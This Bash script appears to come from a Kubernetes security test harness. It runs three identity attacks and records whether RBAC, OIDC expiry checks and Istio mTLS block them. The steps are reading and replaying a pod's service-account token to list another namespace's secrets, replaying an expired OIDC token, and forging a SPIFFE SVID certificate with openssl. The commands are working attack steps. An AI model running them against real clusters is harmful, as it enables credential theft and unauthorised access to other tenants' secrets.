#!/usr/bin/env bash
# =============================================================================
# ATTACK A2 — Identity & Authentication Attacks
# Doc class : A2  |  Script: attack2.sh
# Spec      : Rev6 Section 13 / Appendix A
# Objective : bypass identity/auth controls to access protected resources
#
# Techniques (spec-aligned — Appendix A fixes these three; do not substitute):
#   T1 — SA Token Theft       SA token stolen from pod env, replayed to API
#   T2 — OIDC Token Replay    Valid OIDC token captured and reused after its
#                             expiry window
#   T3 — SPIFFE SVID Forgery  Crafted workload cert presented to a
#                             mesh-connected service
#
# Primary defenders:
#   T1 → L3a (RBAC: stolen token has no cross-ns read rights)
#   T2 → L2  (cluster access control: expired OIDC token rejected by apiserver)
#   T3 → L6  (Istio mTLS: forged/untrusted-CA SVID rejected by mesh)
#
# REVISION 6 CORRECTION (this file): the prior version of T2 and T3 quietly
# replaced the spec's actual techniques (OIDC token replay, SPIFFE SVID
# forgery) with SA-TokenRequest-expiry and self-signed-cert-by-CN substitutes,
# on the grounds that OIDC/SPIRE weren't deployed. Appendix A is explicit that
# technique sets are fixed and must not be re-derived or substituted, so both
# are now implemented as literally specified:
#   T2 takes an externally-supplied, already-captured OIDC ID token
#     (OIDC_ID_TOKEN / OIDC_TOKEN_EXP) and replays it past expiry — it does
#     NOT fall back to a different auth mechanism. If OIDC isn't configured
#     on the apiserver, this SKIPs structurally (a Tier 1/2 validity-check
#     concern per Section 12, not something this script should paper over).
#   T3 forges an X.509 cert carrying a SPIFFE ID in the SAN URI field (the
#     actual SVID encoding, not just a CN string) and presents it to the
#     mesh — a faithful SPIFFE SVID forgery regardless of whether a real
#     SPIRE server is present, since the point is testing whether Istio
#     rejects an SVID-shaped cert from an untrusted root.
#
# Output: SUCCESS|<technique>|<detail>
#         BLOCKED|<technique>|<detail>
#         SKIP|<reason>
# =============================================================================
set -euo pipefail

ATTACKER_NS="${ATTACKER_NS:-tenant-lowpriv}"
VICTIM_NS="${VICTIM_NS:-tenant-finserv}"
SEED="${SEED:-$$}"

succeed() { echo "SUCCESS|$1|$2"; exit 0; }
blocked() { echo "BLOCKED|$1|$2"; exit 1; }
skip()    { echo "SKIP|$1";       exit 2; }

TECHNIQUES=(t1-sa-token-theft t2-oidc-token-replay t3-spiffe-svid-forgery)
N_TECH=${#TECHNIQUES[@]}
: "${TECHNIQUE_IDX:?TECHNIQUE_IDX env var required}"
[[ "$TECHNIQUE_IDX" -lt 0 || "$TECHNIQUE_IDX" -ge "$N_TECH" ]] && {
  echo "SKIP|TECHNIQUE_IDX-out-of-range-$TECHNIQUE_IDX"; exit 2; }
TECHNIQUE="${TECHNIQUES[$TECHNIQUE_IDX]}"
echo "[A2] SEED=$SEED TECHNIQUE_IDX=$TECHNIQUE_IDX technique=$TECHNIQUE"

ATTACKER_POD=$(kubectl get pod -n "$ATTACKER_NS" -l app=client \
  --field-selector=status.phase=Running \
  -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)
[[ -z "$ATTACKER_POD" ]] && skip "no-attacker-pod-in-$ATTACKER_NS"

case "$TECHNIQUE" in

  t1-sa-token-theft)
    # Steal SA token from pod environment and replay to access victim resources
    # Success = attacker can read victim namespace secrets with stolen token
    # Blocked by L3a: RBAC denies cross-namespace secret read
    echo "[A2-t1] extracting SA token from $ATTACKER_NS pod env"
    STOLEN_TOKEN=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
      cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true)
    [[ -z "$STOLEN_TOKEN" ]] && skip "no-token-in-pod-env"

    echo "[A2-t1] replaying stolen token against $VICTIM_NS secrets API"
    RESPONSE=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
      sh -c "curl -sk --max-time 5 \
        --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
        -H 'Authorization: Bearer $STOLEN_TOKEN' \
        'https://kubernetes.default.svc/api/v1/namespaces/${VICTIM_NS}/secrets'" \
      2>/dev/null || echo "")

    SECRET_COUNT=$(echo "$RESPONSE" | grep -o '"name": *"[^"]*"' | wc -l || echo "0")
    SECRET_COUNT="${SECRET_COUNT:-0}"
    echo "[A2-t1] secrets accessible with stolen token: $SECRET_COUNT"

    if [[ "$SECRET_COUNT" -gt 0 ]] && ! echo "$RESPONSE" | grep -qi "Forbidden"; then
      succeed "t1-sa-token-theft" "secrets-readable=$SECRET_COUNT via-stolen-token ns=$VICTIM_NS"
    else
      blocked "t1-sa-token-theft" "rbac-denied stolen-token-insufficient-privileges"
    fi
    ;;

  t2-oidc-token-replay)
    # OIDC Token Replay: a valid OIDC ID token, captured while still live,
    # is replayed against the kube-apiserver after its expiry window has
    # passed. Requires the apiserver configured with --oidc-issuer-url et
    # al., and a captured token supplied via OIDC_ID_TOKEN with its unix-
    # epoch expiry via OIDC_TOKEN_EXP (the "capture" step itself is a
    # separate credential-theft scenario, not this technique's concern —
    # this technique tests only the replay-past-expiry path).
    # Success = apiserver accepts the expired OIDC token (L2 not enforcing exp)
    # Blocked by L2: apiserver's OIDC authenticator rejects it as expired
    #
    # If OIDC isn't configured/deployed, this SKIPs rather than substituting
    # a different auth mechanism — do not re-derive the technique.
    [[ -z "${OIDC_ID_TOKEN:-}" ]] && skip "no-oidc-token-supplied-oidc-not-deployed"
    [[ -z "${OIDC_TOKEN_EXP:-}" ]] && skip "no-oidc-token-exp-supplied"

    NOW=$(date +%s)
    WAIT=$(( OIDC_TOKEN_EXP - NOW + 2 ))
    if [[ "$WAIT" -gt 0 ]]; then
      echo "[A2-t2] waiting ${WAIT}s for captured OIDC token to pass its expiry"
      sleep "$WAIT"
    fi

    echo "[A2-t2] replaying expired OIDC token to kube apiserver"
    RESPONSE=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
      sh -c "curl -sk --max-time 5 \
        --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
        -H 'Authorization: Bearer $OIDC_ID_TOKEN' \
        'https://kubernetes.default.svc/api/v1/namespaces/default/pods'" \
      2>/dev/null || echo "")

    echo "[A2-t2] expired-OIDC-token response: $(echo "$RESPONSE" | head -c 200)"

    if echo "$RESPONSE" | grep -qi "Unauthorized\|invalid.*token\|expired\|401"; then
      blocked "t2-oidc-token-replay" "l2-rejected-expired-oidc-token"
    elif echo "$RESPONSE" | grep -qi "Forbidden\|403"; then
      # Token accepted by L2 (auth passed) but RBAC blocked access — L2 failed to block
      succeed "t2-oidc-token-replay" "expired-oidc-token-accepted-by-apiserver rbac-then-blocked"
    elif echo "$RESPONSE" | grep -qi "items\|pods\|apiVersion"; then
      succeed "t2-oidc-token-replay" "expired-oidc-token-accepted-full-access"
    else
      blocked "t2-oidc-token-replay" "l2-rejected-or-network-error"
    fi
    ;;

  t3-spiffe-svid-forgery)
    # Forge an X.509 cert carrying a SPIFFE ID in the SAN URI field — the
    # actual SVID encoding a real SPIRE server would issue — and present it
    # to a mesh-connected service. This is a genuine SVID forgery (crafted
    # identity, untrusted root), not a generic self-signed cert.
    # Success = mesh service accepts the forged SVID (L6 not enforcing)
    # Blocked by L6: Istio STRICT mTLS rejects certs not chained to the
    # mesh's trusted root (the real SPIRE/Istio CA)
    echo "[A2-t3] forging SPIFFE SVID (SAN URI) and presenting to mesh service"

    VICTIM_SVC="productpage.${VICTIM_NS}.svc.cluster.local"
    FORGED_SPIFFE_ID="spiffe://cluster.local/ns/${VICTIM_NS}/sa/default"

    SPOOF_OUT=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
      sh -c "
        cat > /tmp/svid.cnf <<CNF
[req]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no
[req_distinguished_name]
CN = forged-svid
[v3_req]
subjectAltName = @alt_names
[alt_names]
URI.1 = ${FORGED_SPIFFE_ID}
CNF
        openssl req -x509 -newkey rsa:2048 -keyout /tmp/spoof.key \
          -out /tmp/spoof.crt -days 1 -nodes \
          -config /tmp/svid.cnf -extensions v3_req \
          2>/dev/null

        curl -sk --max-time 5 \
          --cert /tmp/spoof.crt \
          --key /tmp/spoof.key \
          'https://${VICTIM_SVC}:443/' \
          -o /dev/null -w '%{http_code}' 2>/dev/null || echo '000'
      " 2>/dev/null || echo "000")

    echo "[A2-t3] forged-SVID result: $SPOOF_OUT"

    # Also try plain HTTPS without any client cert (should fail if mTLS STRICT)
    PLAIN_TLS=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
      curl -sk --max-time 5 \
      "https://${VICTIM_SVC}:443/" \
      -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")
    echo "[A2-t3] plain TLS (no client cert): $PLAIN_TLS"

    if [[ "$SPOOF_OUT" =~ ^[2-3][0-9][0-9]$ ]]; then
      succeed "t3-spiffe-svid-forgery" "mesh-accepted-forged-svid http=$SPOOF_OUT spiffe_id=$FORGED_SPIFFE_ID"
    elif [[ "$PLAIN_TLS" =~ ^[2-3][0-9][0-9]$ ]]; then
      succeed "t3-spiffe-svid-forgery" "mesh-accepted-no-client-cert http=$PLAIN_TLS istio-not-enforcing"
    else
      blocked "t3-spiffe-svid-forgery" "istio-rejected-forged-svid spoof=$SPOOF_OUT plain=$PLAIN_TLS"
    fi
    ;;

  *)
    skip "unknown-technique-$TECHNIQUE"
    ;;
esac
